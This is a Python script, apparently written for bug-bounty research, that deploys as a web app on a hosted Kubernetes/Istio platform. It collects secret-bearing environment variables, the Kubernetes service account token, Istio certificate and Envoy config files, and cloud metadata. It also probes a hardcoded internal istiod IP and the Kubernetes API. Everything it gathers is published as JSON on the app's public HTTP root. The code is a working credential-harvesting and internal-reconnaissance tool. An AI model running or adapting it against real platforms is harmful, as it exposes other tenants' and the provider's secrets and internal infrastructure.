#!/usr/bin/env python3
"""
App Platform Istio xDS / internal network probe
Runs as a web service, reports findings via HTTP
"""
import os
import sys
import socket
import subprocess
import json
import http.server
import threading
import time

RESULTS = {}

def try_dns(hostname):
    try:
        result = socket.getaddrinfo(hostname, None)
        ips = list(set([r[4][0] for r in result]))
        return {"resolved": True, "ips": ips}
    except Exception as e:
        return {"resolved": False, "error": str(e)}

def try_tcp(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((host, port))
        s.close()
        return {"open": r == 0, "code": r}
    except Exception as e:
        return {"open": False, "error": str(e)}

def try_http(host, port, path="/", timeout=3):
    try:
        import urllib.request
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "BBP-Probe/1.0"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(2048).decode("utf-8", errors="replace")
            return {"status": r.status, "body": body[:500]}
    except Exception as e:
        return {"error": str(e)[:200]}

def try_curl(cmd):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=5, text=True)
        return {"stdout": r.stdout[:500], "stderr": r.stderr[:200], "rc": r.returncode}
    except Exception as e:
        return {"error": str(e)[:200]}

def probe():
    res = {}
    
    # 1. Environment variables (look for k8s service account, istio, DO secrets)
    env_vars = dict(os.environ)
    interesting_keys = [k for k in env_vars if any(x in k.upper() for x in 
        ["ISTIO", "KUBE", "TOKEN", "SECRET", "PASS", "KEY", "CLUSTER", "DATABASE", 
         "REDIS", "MONGO", "HOST", "SVC", "PILOT", "MESH", "DO_", "DIGI"])]
    res["env_interesting"] = {k: env_vars[k][:100] for k in interesting_keys[:30]}
    res["env_all_keys"] = sorted(env_vars.keys())[:50]
    
    # 2. /etc/hosts and /etc/resolv.conf
    try:
        res["etc_hosts"] = open("/etc/hosts").read()[:1000]
    except: res["etc_hosts"] = "error"
    try:
        res["resolv_conf"] = open("/etc/resolv.conf").read()[:500]
    except: res["resolv_conf"] = "error"
    
    # 3. K8s service account token
    try:
        res["sa_token"] = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()[:200]
    except: res["sa_token"] = "not found"
    try:
        res["sa_namespace"] = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read()
    except: res["sa_namespace"] = "not found"
    try:
        res["sa_cacert_exists"] = os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
    except: res["sa_cacert_exists"] = False
    
    # 4. Istio sidecar proxy admin API (localhost)
    res["istio_admin_15000"] = try_http("127.0.0.1", 15000, "/")
    res["istio_admin_15020"] = try_http("127.0.0.1", 15020, "/healthz/ready")
    res["istio_admin_15000_clusters"] = try_http("127.0.0.1", 15000, "/clusters")
    res["istio_admin_15000_config"] = try_http("127.0.0.1", 15000, "/config_dump")
    res["istio_admin_15000_listeners"] = try_http("127.0.0.1", 15000, "/listeners")
    
    # 5. Istiod DNS resolution
    istio_dns_targets = [
        "istiod.istio-system.svc.cluster.local",
        "istiod-remote.istio-system.svc.cluster.local",
        "pilot.istio-system.svc.cluster.local",
        "istio-pilot.istio-system.svc.cluster.local",
    ]
    res["istiod_dns"] = {h: try_dns(h) for h in istio_dns_targets}
    
    # 6. Known Istiod IP from prior research
    istiod_ip = "100.126.246.195"
    res["istiod_known_ip_ports"] = {}
    for port in [8080, 15010, 15012, 15014, 9093]:
        res["istiod_known_ip_ports"][port] = try_tcp(istiod_ip, port, timeout=3)
    
    # 7. HTTP to istiod debug endpoints
    res["istiod_debug_8080"] = try_http(istiod_ip, 8080, "/debug/endpointz")
    res["istiod_debug_8080_meshz"] = try_http(istiod_ip, 8080, "/debug/meshz")
    res["istiod_debug_15014"] = try_http(istiod_ip, 15014, "/debug/endpointz")
    
    # 8. Metadata service
    res["metadata_169"] = try_http("169.254.169.254", 80, "/metadata/v1/")
    
    # 9. /proc/self/net/fib_trie for network interfaces (node-level info)
    try:
        res["proc_net_dev"] = open("/proc/net/dev").read()[:1000]
    except: res["proc_net_dev"] = "error"
    
    # 10. Check for Istio cert/key files
    istio_cert_paths = [
        "/etc/istio/proxy/envoy-rev0.json",
        "/etc/certs/root-cert.pem",
        "/var/run/secrets/istio/root-cert.pem",
        "/etc/ssl/certs/istio",
    ]
    res["istio_cert_files"] = {}
    for p in istio_cert_paths:
        try:
            exists = os.path.exists(p)
            if exists:
                res["istio_cert_files"][p] = open(p).read()[:500]
            else:
                res["istio_cert_files"][p] = "not found"
        except Exception as e:
            res["istio_cert_files"][p] = str(e)

    # 11. Scan Kubernetes API server
    k8s_api = try_http("kubernetes.default.svc.cluster.local", 443)
    k8s_api_http = try_http("kubernetes.default.svc.cluster.local", 80)
    k8s_ip = try_dns("kubernetes.default.svc.cluster.local")
    res["k8s_api"] = {"dns": k8s_ip, "https": k8s_api, "http": k8s_api_http}
    
    # 12. Internal cluster IPs scan for common services
    # From resolv.conf get cluster domain
    cluster_search = ""
    try:
        rc = open("/etc/resolv.conf").read()
        for line in rc.split("\n"):
            if line.startswith("search"):
                cluster_search = line.split()[1] if len(line.split()) > 1 else ""
    except: pass
    res["cluster_search_domain"] = cluster_search

    return res

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(RESULTS, indent=2).encode())
        elif self.path == "/health":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, *args): pass

def run_probe_bg():
    time.sleep(2)
    RESULTS.update(probe())
    print("Probe complete", flush=True)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=run_probe_bg, daemon=True).start()
    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    print(f"Listening on {port}", flush=True)
    server.serve_forever()
